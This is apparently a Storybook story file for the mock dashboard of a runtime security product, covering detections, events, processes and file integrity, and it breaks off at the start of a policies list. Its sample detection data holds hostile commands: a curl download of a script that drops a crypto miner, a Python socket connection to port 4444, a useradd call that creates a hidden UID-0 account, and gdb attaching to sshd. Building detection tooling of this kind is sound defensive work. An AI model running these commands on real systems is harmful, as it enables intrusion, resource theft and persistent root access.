import { Fragment, useState } from "react";
import type { Meta, StoryObj } from "@storybook/react-vite";
import { expect, userEvent, within } from "storybook/test";
import { Activity, Cpu, Download, FileLock, Plus, ScrollText, Server, ShieldAlert } from "lucide-react";
import { ProductApp } from "../ProductFrame";
import { Callout } from "../../components/Callout";
import { PageHeader } from "../../components/PageHeader";
import { Button } from "../../components/Button";
import { KpiCard, KpiGrid } from "../../components/Kpi";
import { Panel } from "../../components/Panel";
import { FilterBar, FacetFilter, QueryBar, TimeRangePicker } from "../../components/Filters";
import { SearchInput, SelectField, Switch } from "../../components/Controls";
import { SegmentedControl } from "../../components/SegmentedControl";
import { Tabs } from "../../components/Tabs";
import { DataTable, type Column } from "../../components/DataTable";
import { Badge, SeverityBadge, StatusBadge } from "../../components/Badge";
import { EntityChip } from "../../components/EntityChip";
import { StackedBarChart } from "../../charts/StackedBarChart";
import { Sparkline } from "../../charts/Sparkline";
import { SEVERITY_META, TONE_COLORS, type Severity } from "../../tokens/levels";
import { rng, timeLabels, wave } from "../mocks";

const nav = [
  { id: "detections", label: "Detections", icon: ShieldAlert, count: 12 },
  { id: "events", label: "Events", icon: Activity },
  { id: "processes", label: "Processes", icon: Cpu },
  { id: "fim", label: "File integrity", icon: FileLock },
  { id: "policies", label: "Policies", icon: ScrollText, count: 34 },
  { id: "hosts", label: "Hosts", icon: Server },
];

const meta = {
  title: "Products/Runtime",
  parameters: { layout: "fullscreen" },
} satisfies Meta;

export default meta;
type Story = StoryObj<typeof meta>;

interface ProcNode {
  pid: number;
  cmd: string;
  user: string;
  flagged?: boolean;
  children?: ProcNode[];
}

interface Detection {
  id: string;
  severity: Severity;
  title: string;
  rule: string;
  host: string;
  container?: string;
  process: string;
  time: string;
  tree: ProcNode;
}

const detections: Detection[] = [
  {
    id: "d1",
    severity: "high",
    title: "Shell spawned in container",
    rule: "container.shell_spawned",
    host: "worker-prod-04",
    container: "orders-api-6f9c7d",
    process: "/bin/sh -c id; uname -a",
    time: "13:58:12",
    tree: {
      pid: 4120,
      cmd: "containerd-shim-runc-v2 -namespace k8s.io -id 7d1e…",
      user: "root",
      children: [
        {
          pid: 4188,
          cmd: "node /app/server.js",
          user: "app",
          children: [{ pid: 30551, cmd: "/bin/sh -c id; uname -a", user: "app", flagged: true, children: [{ pid: 30552, cmd: "id", user: "app" }] }],
        },
      ],
    },
  },
  {
    id: "d2",
    severity: "critical",
    title: "Crypto miner executed from /tmp",
    rule: "proc.cryptominer_exec",
    host: "worker-prod-09",
    container: "reports-cron-28831",
    process: "/tmp/.x/kworker -o pool:3333",
    time: "13:41:07",
    tree: {
      pid: 2210,
      cmd: "containerd-shim-runc-v2 -namespace k8s.io -id 3c90…",
      user: "root",
      children: [
        {
          pid: 2264,
          cmd: "sh -c /opt/reports/run.sh",
          user: "app",
          children: [
            {
              pid: 18803,
              cmd: "curl -fsSL http://203.0.113.181/x.sh -o /tmp/.x/k",
              user: "app",
              flagged: true,
              children: [{ pid: 18840, cmd: "/tmp/.x/kworker -o 198.51.100.201:3333 --donate-level 0", user: "app", flagged: true }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "d3",
    severity: "high",
    title: "Unexpected outbound to 198.51.100.201:4444",
    rule: "net.outbound_unexpected_port",
    host: "api-prod-03",
    container: "payments-api-55b8",
    process: "python3 -c import socket…",
    time: "13:22:45",
    tree: {
      pid: 980,
      cmd: "containerd-shim-runc-v2 -namespace k8s.io -id 91fa…",
      user: "root",
      children: [{ pid: 1012, cmd: "gunicorn payments.wsgi -w 4", user: "app", children: [{ pid: 22107, cmd: "python3 -c 'import socket,os;s=socket.socket();s.connect((\"198.51.100.201\",4444))'", user: "app", flagged: true }] }],
    },
  },
  {
    id: "d4",
    severity: "high",
    title: "/etc/passwd modified",
    rule: "fim.sensitive_file_write",
    host: "db-prod-02",
    process: "useradd -o -u 0 backup2",
    time: "12:57:30",
    tree: {
      pid: 1,
      cmd: "/sbin/init",
      user: "root",
      children: [{ pid: 812, cmd: "sshd: /usr/sbin/sshd -D", user: "root", children: [{ pid: 40211, cmd: "bash", user: "root", children: [{ pid: 40290, cmd: "useradd -o -u 0 backup2", user: "root", flagged: true }] }] }],
    },
  },
  {
    id: "d5",
    severity: "medium",
    title: "Kernel module loaded",
    rule: "kernel.module_load",
    host: "edge-fra-02",
    process: "insmod /lib/modules/6.8.0/extra/nf_tap.ko",
    time: "11:15:02",
    tree: {
      pid: 1,
      cmd: "/sbin/init",
      user: "root",
      children: [{ pid: 655, cmd: "/usr/bin/ansible-playbook site.yml", user: "root", children: [{ pid: 7712, cmd: "insmod /lib/modules/6.8.0/extra/nf_tap.ko", user: "root", flagged: true }] }],
    },
  },
  {
    id: "d6",
    severity: "medium",
    title: "ptrace on sshd",
    rule: "proc.ptrace_attach",
    host: "api-prod-01",
    process: "gdb -p 812",
    time: "10:49:51",
    tree: {
      pid: 1,
      cmd: "/sbin/init",
      user: "root",
      children: [{ pid: 3001, cmd: "tmux new -s debug", user: "chris", children: [{ pid: 3044, cmd: "bash", user: "chris", children: [{ pid: 3190, cmd: "sudo gdb -p 812", user: "root", flagged: true }] }] }],
    },
  },
];

const columns: Column<Detection>[] = [
  { id: "sev", header: "Severity", width: "96px", sortValue: (d) => SEVERITY_META[d.severity].rank, cell: (d) => <SeverityBadge severity={d.severity} /> },
  {
    id: "title",
    header: "Detection",
    width: "28%",
    cell: (d) => (
      <span className="flex min-w-0 flex-col">
        <span className="truncate font-medium">{d.title}</span>
        <span className="truncate font-mono text-2xs text-fg-muted">{d.rule}</span>
      </span>
    ),
  },
  {
    id: "where",
    header: "Host / container",
    cell: (d) => (
      <span className="flex flex-wrap gap-1">
        <EntityChip kind="host" value={d.host} hideKind />
        {d.container && <EntityChip kind="container" value={d.container} hideKind />}
      </span>
    ),
  },
  {
    id: "proc",
    header: "Process",
    width: "24%",
    cell: (d) => (
      <span className="block truncate font-mono text-xs" title={d.process}>
        {d.process}
      </span>
    ),
  },
  { id: "time", header: "Time", align: "right", mono: true, sortValue: (d) => d.time, cell: (d) => d.time },
];

function ProcessTree({ node }: { node: ProcNode }) {
  return (
    <li className="flex flex-col">
      <span
        className={
          node.flagged
            ? "flex items-start gap-2 rounded bg-danger-soft px-1.5 py-1 text-danger-text"
            : "flex items-start gap-2 px-1.5 py-1"
        }
      >
        <span className="w-12 shrink-0 font-mono text-2xs text-fg-muted">{node.pid}</span>
        <span className="min-w-0 grow font-mono text-xs break-all">{node.cmd}</span>
        <span className="shrink-0 font-mono text-2xs text-fg-muted">{node.user}</span>
      </span>
      {node.children && node.children.length > 0 && (
        <ul className="ml-3 flex flex-col border-l border-line pl-2">
          {node.children.map((c) => (
            <ProcessTree key={c.pid} node={c} />
          ))}
        </ul>
      )}
    </li>
  );
}

const HOURS = 24;
const hours = timeLabels(HOURS, 60);
const sevOrder: Severity[] = ["info", "low", "medium", "high", "critical"];
const r = rng(77);
const perHour = hours.map((_, i) =>
  sevOrder.map((s) => {
    const base = { info: 60, low: 22, medium: 9, high: 3, critical: 0.4 }[s];
    const burst = i >= 18 && i <= 21 && (s === "high" || s === "critical") ? 3 : 1;
    return Math.round(base * burst * (0.6 + r() * 0.8));
  }),
);

/** Runtime detections: events per hour, detections and the process tree of the selected one. */
function DetectionsPage() {
    const [range, setRange] = useState("24h");
    const [sev, setSev] = useState<string[]>([]);
    const [selected, setSelected] = useState("d2");
    const rows = detections.filter((d) => sev.length === 0 || sev.includes(d.severity));
    const current = detections.find((d) => d.id === selected);
    return (
      <>
        <PageHeader
          title="Detections"
          description="eBPF sensor 0.14 on 46 hosts and 312 pods · 34 policies enforced"
          meta={<StatusBadge tone="danger">2 critical open</StatusBadge>}
          actions={
            <>
              <SearchInput label="Search detections, hosts or processes" className="w-72" />
              <Button size="md" icon={<ScrollText />}>
                Edit policies
              </Button>
            </>
          }
        />
        <FilterBar>
          <TimeRangePicker value={range} onChange={setRange} />
          <FacetFilter
            label="Severity"
            selected={sev}
            onChange={setSev}
            options={(["critical", "high", "medium", "low"] as Severity[]).map((s) => ({
              value: s,
              label: SEVERITY_META[s].label,
              count: detections.filter((d) => d.severity === s).length,
            }))}
          />
        </FilterBar>
        <KpiGrid>
          <KpiCard label="Open detections" value="12" unit="last 24 h" tone="danger" delta={{ label: "+5 vs. yesterday", direction: "up", intent: "bad" }} />
          <KpiCard label="Events · 24 h" value="2.31M" unit="exec, net, file" delta={{ label: "98.7% dropped by policy" }} />
          <KpiCard label="Sensors reporting" value="46" unit="of 47 hosts" delta={{ label: "edge-lon-01 silent for 2 h", intent: "bad" }} />
          <KpiCard label="FIM changes · 24 h" value="31" unit="files" delta={{ label: "1 outside change window", intent: "bad" }} />
        </KpiGrid>
        <Panel title="Events per hour" description="Matched rules, by severity">
          <StackedBarChart
            label="Runtime events per hour by severity"
            categories={hours}
            segments={sevOrder.map((s) => ({ id: s, name: SEVERITY_META[s].label, color: TONE_COLORS[SEVERITY_META[s].tone] }))}
            values={perHour}
            height={150}
            xTicks={7}
          />
        </Panel>
        <div className="grid gap-2.5 xl:grid-cols-[minmax(0,3fr)_minmax(340px,2fr)]">
          <Panel title="Detections" description="Select a row to see its process tree" flush>
            <DataTable
              label="Runtime detections"
              columns={columns}
              rows={rows}
              getRowId={(d) => d.id}
              onRowClick={(d) => setSelected(d.id)}
              activeRowId={selected}
              defaultSort={{ id: "time", direction: "desc" }}
              minWidth={860}
            />
          </Panel>
          <Panel
            title="Process tree"
            description={current ? `${current.title} · ${current.host}` : "No detection selected"}
            actions={current && <Badge mono>{current.rule}</Badge>}
            aria-label="Process tree"
          >
            {current ? (
              <div className="flex flex-col gap-2">
                <ul aria-label={`Process tree for ${current.title}`} className="flex flex-col text-sm">
                  <ProcessTree node={current.tree} />
                </ul>
                <div className="flex flex-wrap gap-1.5 border-t border-line pt-2">
                  <Button size="sm" variant="danger">
                    Kill process
                  </Button>
                  <Button size="sm">Isolate host</Button>
                  <Button size="sm" variant="ghost">
                    Open in SIEM
                  </Button>
                </div>
              </div>
            ) : (
              <p className="py-6 text-center text-sm text-fg-muted">Select a detection</p>
            )}
          </Panel>
        </div>
      </>
    );
}

/* ------------------------------------------------------------------ */
/* Events                                                              */
/* ------------------------------------------------------------------ */

type EventKind = "exec" | "network" | "file" | "kernel";

interface RtEvent {
  id: string;
  ts: string;
  kind: EventKind;
  host: string;
  container?: string;
  pid: number;
  user: string;
  summary: string;
  rule?: string;
  action: "allowed" | "alerted" | "blocked";
  fields: Record<string, string | number>;
}

const EVENTS: RtEvent[] = [
  { id: "e1", ts: "13:58:12.418", kind: "exec", host: "worker-prod-04", container: "orders-api-6f9c7d", pid: 30551, user: "app", summary: "/bin/sh -c id; uname -a", rule: "container.shell_spawned", action: "alerted", fields: { "proc.ppid": 4188, "proc.parent": "node", "proc.exe": "/bin/sh", "container.image": "registry.example.com/orders-api:2.14.1", "k8s.ns": "orders" } },
  { id: "e2", ts: "13:58:12.420", kind: "exec", host: "worker-prod-04", container: "orders-api-6f9c7d", pid: 30552, user: "app", summary: "id", action: "allowed", fields: { "proc.ppid": 30551, "proc.parent": "sh", "proc.exe": "/usr/bin/id", "k8s.ns": "orders" } },
  { id: "e3", ts: "13:57:40.002", kind: "network", host: "api-prod-03", container: "payments-api-55b8", pid: 1012, user: "app", summary: "connect 10.20.4.17:5432 tcp", action: "allowed", fields: { "net.dst": "10.20.4.17", "net.dport": 5432, "net.proto": "tcp", "k8s.ns": "payments" } },
  { id: "e4", ts: "13:56:03.771", kind: "file", host: "db-prod-01", pid: 2201, user: "postgres", summary: "write /var/lib/postgresql/16/main/pg_wal/0000000100000A2F", action: "allowed", fields: { "fd.name": "/var/lib/postgresql/16/main/pg_wal/0000000100000A2F", "evt.type": "openat", "fd.flags": "O_WRONLY" } },
  { id: "e5", ts: "13:41:07.130", kind: "exec", host: "worker-prod-09", container: "reports-cron-28831", pid: 18840, user: "app", summary: "/tmp/.x/kworker -o 198.51.100.201:3333", rule: "proc.cryptominer_exec", action: "blocked", fields: { "proc.ppid": 18803, "proc.exe": "/tmp/.x/kworker", "proc.sha256": "9f2c…e81a", "k8s.ns": "reports" } },
  { id: "e6", ts: "13:41:06.904", kind: "network", host: "worker-prod-09", container: "reports-cron-28831", pid: 18803, user: "app", summary: "connect 203.0.113.181:80 tcp", rule: "net.outbound_untrusted", action: "alerted", fields: { "net.dst": "203.0.113.181", "net.dport": 80, "net.proto": "tcp", "k8s.ns": "reports" } },
  { id: "e7", ts: "13:22:45.511", kind: "network", host: "api-prod-03", container: "payments-api-55b8", pid: 22107, user: "app", summary: "connect 198.51.100.201:4444 tcp", rule: "net.outbound_unexpected_port", action: "alerted", fields: { "net.dst": "198.51.100.201", "net.dport": 4444, "net.proto": "tcp", "k8s.ns": "payments" } },
  { id: "e8", ts: "12:57:30.090", kind: "file", host: "db-prod-02", pid: 40290, user: "root", summary: "write /etc/passwd", rule: "fim.sensitive_file_write", action: "alerted", fields: { "fd.name": "/etc/passwd", "evt.type": "rename", "proc.name": "useradd" } },
  { id: "e9", ts: "11:15:02.664", kind: "kernel", host: "edge-fra-02", pid: 7712, user: "root", summary: "init_module nf_tap", rule: "kernel.module_load", action: "alerted", fields: { "evt.type": "finit_module", "module.name": "nf_tap", "module.signed": "no" } },
  { id: "e10", ts: "10:49:51.208", kind: "kernel", host: "api-prod-01", pid: 3190, user: "root", summary: "ptrace PTRACE_ATTACH pid 812", rule: "proc.ptrace_attach", action: "alerted", fields: { "evt.type": "ptrace", "ptrace.target": 812, "ptrace.target_name": "sshd" } },
  { id: "e11", ts: "10:12:18.355", kind: "exec", host: "api-prod-05", container: "search-api-77d1", pid: 912, user: "app", summary: "java -jar /app/search.jar", action: "allowed", fields: { "proc.ppid": 1, "proc.exe": "/usr/bin/java", "k8s.ns": "search" } },
  { id: "e12", ts: "09:40:02.017", kind: "file", host: "edge-fra-02", pid: 1840, user: "root", summary: "write /etc/nginx/conf.d/edge.conf", action: "allowed", fields: { "fd.name": "/etc/nginx/conf.d/edge.conf", "evt.type": "openat", "proc.name": "ansible" } },
];

const KIND_TONE = { exec: "info", network: "neutral", file: "warning", kernel: "danger" } as const;
const ACTION_TONE = { allowed: "neutral", alerted: "warning", blocked: "danger" } as const;

function EventsPage() {
  const [range, setRange] = useState("1h");
  const [kind, setKind] = useState<"all" | EventKind>("all");
  const [draft, setDraft] = useState("");
  const [query, setQuery] = useState("");
  const [active, setActive] = useState<string | undefined>("e5");
  const rows = EVENTS.filter((e) => (kind === "all" || e.kind === kind) && (!query || `${e.host} ${e.summary} ${e.rule ?? ""} ${e.container ?? ""}`.toLowerCase().includes(query.toLowerCase())));
  const cur = EVENTS.find((e) => e.id === active);
  const cols: Column<RtEvent>[] = [
    { id: "ts", header: "Time", mono: true, width: "110px", sortValue: (e) => e.ts, cell: (e) => e.ts },
    { id: "kind", header: "Type", width: "90px", cell: (e) => <Badge tone={KIND_TONE[e.kind]}>{e.kind}</Badge> },
    { id: "host", header: "Host", cell: (e) => <EntityChip kind="host" value={e.host} hideKind /> },
    { id: "pid", header: "PID", mono: true, align: "right", width: "70px", cell: (e) => e.pid },
    { id: "summary", header: "Event", width: "34%", cell: (e) => <span className="block truncate font-mono text-xs" title={e.summary}>{e.summary}</span> },
    { id: "action", header: "Result", width: "90px", description: "Allowed events matched no rule; alerted ones raised a detection; blocked ones were stopped by an enforce-mode policy.", cell: (e) => <Badge tone={ACTION_TONE[e.action]}>{e.action}</Badge> },
  ];
  return (
    <>
      <PageHeader title="Events" description="Raw syscall-level events from the eBPF sensor. 98.7% are dropped at the edge by policy; these are the kept ones." />
      <FilterBar onClear={query || kind !== "all" ? () => (setQuery(""), setDraft(""), setKind("all")) : undefined}>
        <TimeRangePicker value={range} onChange={setRange} />
        <QueryBar value={draft} onChange={setDraft} onSubmit={setQuery} placeholder="host:api-prod-03 or /etc/passwd" label="Search events" className="min-w-64 grow" />
      </FilterBar>
      <Tabs
        label="Event type"
        value={kind}
        onChange={setKind}
        items={[
          { value: "all", label: "All", count: EVENTS.length },
          { value: "exec", label: "Exec", count: EVENTS.filter((e) => e.kind === "exec").length },
          { value: "network", label: "Network", count: EVENTS.filter((e) => e.kind === "network").length },
          { value: "file", label: "File", count: EVENTS.filter((e) => e.kind === "file").length },
          { value: "kernel", label: "Kernel", count: EVENTS.filter((e) => e.kind === "kernel").length },
        ]}
      />
      <div className="grid gap-2.5 xl:grid-cols-[minmax(0,2fr)_minmax(0,1fr)]">
        <Panel title="Events" description={`${rows.length} events`} flush>
          <DataTable label="Runtime events" columns={cols} rows={rows} getRowId={(e) => e.id} onRowClick={(e) => setActive(e.id)} activeRowId={active} defaultSort={{ id: "ts", direction: "desc" }} minWidth={820} empty={<p className="py-8">No events match</p>} />
        </Panel>
        <Panel title="Event fields" description={cur ? `${cur.kind} · ${cur.ts}` : "No event selected"} aria-label="Event fields">
          {cur ? (
            <div className="flex flex-col gap-2">
              <dl className="grid grid-cols-[auto_minmax(0,1fr)] gap-x-3 gap-y-1 text-sm">
                <dt className="text-fg-muted">host</dt>
                <dd className="font-mono text-xs">{cur.host}</dd>
                {cur.container && (
                  <>
                    <dt className="text-fg-muted">container</dt>
                    <dd className="font-mono text-xs break-all">{cur.container}</dd>
                  </>
                )}
                <dt className="text-fg-muted">user</dt>
                <dd className="font-mono text-xs">{cur.user}</dd>
                {Object.entries(cur.fields).map(([k, v]) => (
                  <Fragment key={k}>
                    <dt className="font-mono text-xs text-fg-muted">{k}</dt>
                    <dd className="font-mono text-xs break-all">{v}</dd>
                  </Fragment>
                ))}
              </dl>
              {cur.rule ? (
                <Callout tone={cur.action === "blocked" ? "danger" : "warning"} title={`Matched ${cur.rule}`}>
                  {cur.action === "blocked" ? "The process was killed before it ran." : "A detection was raised; the process kept running."}
                </Callout>
              ) : (
                <p className="text-xs text-fg-muted">No rule matched. Kept because the host is in full-capture mode.</p>
              )}
            </div>
          ) : (
            <p className="py-6 text-center text-sm text-fg-muted">Select an event</p>
          )}
        </Panel>
      </div>
    </>
  );
}

/* ------------------------------------------------------------------ */
/* Processes                                                           */
/* ------------------------------------------------------------------ */

interface Proc {
  pid: number;
  ppid: number;
  cmd: string;
  user: string;
  cpu: number;
  memMb: number;
  started: string;
  baseline: "known" | "new" | "drift";
  container?: string;
}

const PROCS: Record<string, Proc[]> = {
  "worker-prod-09": [
    { pid: 1, ppid: 0, cmd: "/sbin/init", user: "root", cpu: 0, memMb: 12, started: "41 d ago", baseline: "known" },
    { pid: 702, ppid: 1, cmd: "/usr/bin/containerd", user: "root", cpu: 0.8, memMb: 96, started: "41 d ago", baseline: "known" },
    { pid: 731, ppid: 1, cmd: "/usr/bin/kubelet --config=/var/lib/kubelet/config.yaml", user: "root", cpu: 2.1, memMb: 148, started: "41 d ago", baseline: "known" },
    { pid: 2264, ppid: 2210, cmd: "sh -c /opt/reports/run.sh", user: "app", cpu: 0, memMb: 2, started: "13:40", baseline: "known", container: "reports-cron-28831" },
    { pid: 18803, ppid: 2264, cmd: "curl -fsSL http://203.0.113.181/x.sh -o /tmp/.x/k", user: "app", cpu: 0, memMb: 6, started: "13:41", baseline: "new", container: "reports-cron-28831" },
    { pid: 18840, ppid: 18803, cmd: "/tmp/.x/kworker -o 198.51.100.201:3333 --donate-level 0", user: "app", cpu: 0, memMb: 0, started: "13:41 · killed", baseline: "new", container: "reports-cron-28831" },
    { pid: 3302, ppid: 702, cmd: "python3 -m celery worker -A reports", user: "app", cpu: 14.6, memMb: 612, started: "2 d ago", baseline: "known", container: "reports-worker-4b2" },
    { pid: 3360, ppid: 3302, cmd: "python3 -m celery worker -A reports --pool=prefork", user: "app", cpu: 9.2, memMb: 388, started: "2 d ago", baseline: "drift", container: "reports-worker-4b2" },
    { pid: 990, ppid: 1, cmd: "/opt/openasy/sensor --mode=ebpf", user: "root", cpu: 1.4, memMb: 74, started: "6 d ago", baseline: "known" },
  ],
  "api-prod-03": [
    { pid: 1, ppid: 0, cmd: "/sbin/init", user: "root", cpu: 0, memMb: 11, started: "18 d ago", baseline: "known" },
    { pid: 1012, ppid: 980, cmd: "gunicorn payments.wsgi -w 4", user: "app", cpu: 22.4, memMb: 840, started: "3 d ago", baseline: "known", container: "payments-api-55b8" },
    { pid: 22107, ppid: 1012, cmd: "python3 -c 'import socket,os;s=socket.socket()…'", user: "app", cpu: 0.1, memMb: 9, started: "13:22", baseline: "new", container: "payments-api-55b8" },
    { pid: 1188, ppid: 1, cmd: "/usr/sbin/sshd -D", user: "root", cpu: 0, memMb: 6, started: "18 d ago", baseline: "known" },
    { pid: 990, ppid: 1, cmd: "/opt/openasy/sensor --mode=ebpf", user: "root", cpu: 1.1, memMb: 70, started: "6 d ago", baseline: "known" },
  ],
};

const BASELINE_TONE = { known: "neutral", new: "danger", drift: "warning" } as const;

function ProcessesPage() {
  const [host, setHost] = useState("worker-prod-09");
  const [onlyNew, setOnlyNew] = useState(false);
  const [killed, setKilled] = useState<number[]>([]);
  const all = PROCS[host] ?? [];
  const rows = all.filter((p) => !onlyNew || p.baseline !== "known");
  const cols: Column<Proc>[] = [
    { id: "pid", header: "PID", mono: true, align: "right", width: "70px", sortValue: (p) => p.pid, cell: (p) => p.pid },
    { id: "ppid", header: "PPID", mono: true, align: "right", width: "70px", cell: (p) => p.ppid },
    { id: "cmd", header: "Command", width: "38%", cell: (p) => <span className="block truncate font-mono text-xs" title={p.cmd}>{p.cmd}</span> },
    { id: "user", header: "User", mono: true, width: "70px", cell: (p) => p.user },
    { id: "container", header: "Container", cell: (p) => (p.container ? <EntityChip kind="container" value={p.container} hideKind /> : <span className="text-fg-subtle">host</span>) },
    { id: "cpu", header: "CPU %", align: "right", mono: true, sortValue: (p) => p.cpu, cell: (p) => p.cpu.toFixed(1) },
    { id: "mem", header: "Memory", align: "right", mono: true, sortValue: (p) => p.memMb, cell: (p) => `${p.memMb} MB` },
    { id: "baseline", header: "Baseline", description: "Compared to the 14-day learned baseline for this workload. New: never seen. Drift: known binary with new arguments or parent.", sortValue: (p) => p.baseline, cell: (p) => <Badge tone={BASELINE_TONE[p.baseline]}>{p.baseline}</Badge> },
    {
      id: "act",
      header: "",
      width: "84px",
      hideable: false,
      cell: (p) =>
        p.baseline === "known" ? null : killed.includes(p.pid) ? (
          <span className="text-xs text-fg-muted">killed</span>
        ) : (
          <Button size="xs" variant="ghost" onClick={() => setKilled((k) => [...k, p.pid])} aria-label={`Kill ${p.pid}`}>
            Kill
          </Button>
        ),
    },
  ];
  return (
    <>
      <PageHeader title="Processes" description="Live process table per host, compared to each workload's learned baseline." />
      <FilterBar>
        <SelectField label="Host" value={host} onChange={(e) => setHost(e.target.value)} options={Object.keys(PROCS).map((h) => ({ value: h, label: h }))} />
        <Switch checked={onlyNew} onCheckedChange={setOnlyNew} label="Only new or drifted" />
      </FilterBar>
      <KpiGrid>
        <KpiCard label="Processes" value={`${all.length}`} unit="sampled" />
        <KpiCard label="New since baseline" value={`${all.filter((p) => p.baseline === "new").length}`} tone="danger" />
        <KpiCard label="Drifted" value={`${all.filter((p) => p.baseline === "drift").length}`} tone="warning" />
        <KpiCard label="Baseline age" value="14" unit="days" delta={{ label: "Re-learned weekly on Sunday" }} />
      </KpiGrid>
      {killed.length > 0 && (
        <p role="status" className="text-sm text-success">
          Sent SIGKILL to {killed.join(", ")} on {host}
        </p>
      )}
      <Panel title={`Processes on ${host}`} description={`${rows.length} shown`} flush>
        <DataTable label="Processes" columns={cols} rows={rows} getRowId={(p) => `${p.pid}`} defaultSort={{ id: "pid", direction: "asc" }} minWidth={980} />
      </Panel>
    </>
  );
}

/* ------------------------------------------------------------------ */
/* File integrity                                                      */
/* ------------------------------------------------------------------ */

interface FimChange {
  id: string;
  path: string;
  host: string;
  change: "modified" | "created" | "deleted" | "permissions";
  by: string;
  when: string;
  before: string;
  after: string;
  inWindow: boolean;
  status: "unreviewed" | "approved" | "incident";
}

const FIM: FimChange[] = [
  { id: "f1", path: "/etc/passwd", host: "db-prod-02", change: "modified", by: "useradd (root via sshd)", when: "12:57", before: "sha256:4e1a…90c2", after: "sha256:b77d…13fe", inWindow: false, status: "unreviewed" },
  { id: "f2", path: "/etc/shadow", host: "db-prod-02", change: "modified", by: "useradd (root via sshd)", when: "12:57", before: "sha256:0c33…a1d4", after: "sha256:fe02…7b19", inWindow: false, status: "unreviewed" },
  { id: "f3", path: "/etc/nginx/conf.d/edge.conf", host: "edge-fra-02", change: "modified", by: "ansible-playbook (CHG-2291)", when: "09:40", before: "sha256:9a10…55e0", after: "sha256:12bc…d0aa", inWindow: true, status: "approved" },
  { id: "f4", path: "/usr/local/bin/backup.sh", host: "db-prod-01", change: "permissions", by: "chmod 4755 (root)", when: "08:12", before: "0755 root:root", after: "4755 root:root", inWindow: false, status: "unreviewed" },
  { id: "f5", path: "/etc/ssh/sshd_config", host: "api-prod-01", change: "modified", by: "ansible-playbook (CHG-2288)", when: "Yesterday 22:04", before: "sha256:77e1…0b3c", after: "sha256:a4f0…c912", inWindow: true, status: "approved" },
  { id: "f6", path: "/lib/modules/6.8.0/extra/nf_tap.ko", host: "edge-fra-02", change: "created", by: "ansible-playbook (CHG-2291)", when: "11:15", before: "–", after: "sha256:d1c8…4e77", inWindow: true, status: "unreviewed" },
  { id: "f7", path: "/root/.ssh/authorized_keys", host: "worker-prod-04", change: "modified", by: "bash (root)", when: "Yesterday 03:18", before: "sha256:3b9d…e004", after: "sha256:6f21…aa80", inWindow: false, status: "incident" },
  { id: "f8", path: "/etc/cron.d/logrotate", host: "api-prod-05", change: "deleted", by: "apt-get (unattended-upgrades)", when: "Yesterday 06:30", before: "sha256:8810…f2b5", after: "–", inWindow: true, status: "approved" },
];

const FIM_STATUS_TONE = { unreviewed: "warning", approved: "success", incident: "danger" } as const;

function FimPage() {
  const [status, setStatus] = useState<Record<string, FimChange["status"]>>(Object.fromEntries(FIM.map((f) => [f.id, f.status])));
  const [outside, setOutside] = useState(false);
  const [active, setActive] = useState("f1");
  const rows = FIM.filter((f) => !outside || !f.inWindow);
  const cur = FIM.find((f) => f.id === active);
  const cols: Column<FimChange>[] = [
    { id: "path", header: "Path", width: "30%", cell: (f) => <span className="block truncate font-mono text-xs" title={f.path}>{f.path}</span> },
    { id: "host", header: "Host", cell: (f) => <EntityChip kind="host" value={f.host} hideKind /> },
    { id: "change", header: "Change", cell: (f) => <Badge>{f.change}</Badge> },
    { id: "when", header: "When", mono: true, cell: (f) => f.when },
    { id: "window", header: "Change window", description: "Whether the change happened inside an approved change ticket's window.", cell: (f) => (f.inWindow ? <StatusBadge tone="success">Inside</StatusBadge> : <StatusBadge tone="danger">Outside</StatusBadge>) },
    { id: "status", header: "Review", sortValue: (f) => status[f.id] ?? f.status, cell: (f) => <Badge tone={FIM_STATUS_TONE[status[f.id] ?? f.status]}>{status[f.id]}</Badge> },
  ];
  const unreviewed = Object.values(status).filter((s) => s === "unreviewed").length;
  return (
    <>
      <PageHeader title="File integrity" description="1,284 watched paths on 46 hosts: system binaries, auth files, SSH, cron and web server config." actions={<Button icon={<FileLock />}>Edit watched paths</Button>} />
      <KpiGrid>
        <KpiCard label="Changes · 24 h" value="31" unit="files" />
        <KpiCard label="Outside change window" value="4" tone="danger" delta={{ label: "/etc/passwd on db-prod-02", intent: "bad" }} />
        <KpiCard label="Unreviewed" value={`${unreviewed}`} tone={unreviewed ? "warning" : "success"} />
        <KpiCard label="Hosts with baseline" value="46" unit="of 46" />
      </KpiGrid>
      <FilterBar>
        <Switch checked={outside} onCheckedChange={setOutside} label="Only outside change window" />
      </FilterBar>
      <div className="grid gap-2.5 xl:grid-cols-[minmax(0,2fr)_minmax(0,1fr)]">
        <Panel title="Changes" description={`${rows.length} changes`} flush>
          <DataTable label="File changes" columns={cols} rows={rows} getRowId={(f) => f.id} onRowClick={(f) => setActive(f.id)} activeRowId={active} minWidth={860} />
        </Panel>
        <Panel title="Change detail" description={cur?.path ?? "No change selected"} aria-label="Change detail">
          {cur && (
            <div className="flex flex-col gap-2 text-sm">
              <dl className="grid grid-cols-[auto_minmax(0,1fr)] gap-x-3 gap-y-1">
                <dt className="text-fg-muted">Host</dt>
                <dd>{cur.host}</dd>
                <dt className="text-fg-muted">Changed by</dt>
                <dd className="font-mono text-xs">{cur.by}</dd>
                <dt className="text-fg-muted">Before</dt>
                <dd className="font-mono text-xs">{cur.before}</dd>
                <dt className="text-fg-muted">After</dt>
                <dd className="font-mono text-xs">{cur.after}</dd>
              </dl>
              {!cur.inWindow && <Callout tone="danger" title="No change ticket covers this">Nobody scheduled a change on {cur.host} at {cur.when}.</Callout>}
              <div className="flex flex-wrap gap-1.5 border-t border-line pt-2">
                <Button size="sm" variant="primary" disabled={status[cur.id] === "approved"} onClick={() => setStatus((s) => ({ ...s, [cur.id]: "approved" }))}>
                  Approve change
                </Button>
                <Button size="sm" variant="danger" disabled={status[cur.id] === "incident"} onClick={() => setStatus((s) => ({ ...s, [cur.id]: "incident" }))}>
                  Open incident
                </Button>
              </div>
              {status[cur.id] !== cur.status && (
                <p role="status" className="text-xs text-success">
                  {status[cur.id] === "approved" ? "Approved; new hash is the baseline" : "Incident opened and linked"}
                </p>
              )}
            </div>
          )}
        </Panel>
      </div>
    </>
  );
}

/* ------------------------------------------------------------------ */
/* Policies                                                            */
/* ------------------------------------------------------------------ */

type PolicyMode = "enforce" | "alert" | "off";

interface Policy {
  id: string;
  name: string;
  rule: string;
  category: "Process" | "Network" | "File" | "Kernel" | "Container";
  severity: Severity;
  mode: PolicyMode;
  scope: string;
  hits7d: number;
  condition: string;
  attack: string;
}

const POLICIES: Policy[] = [
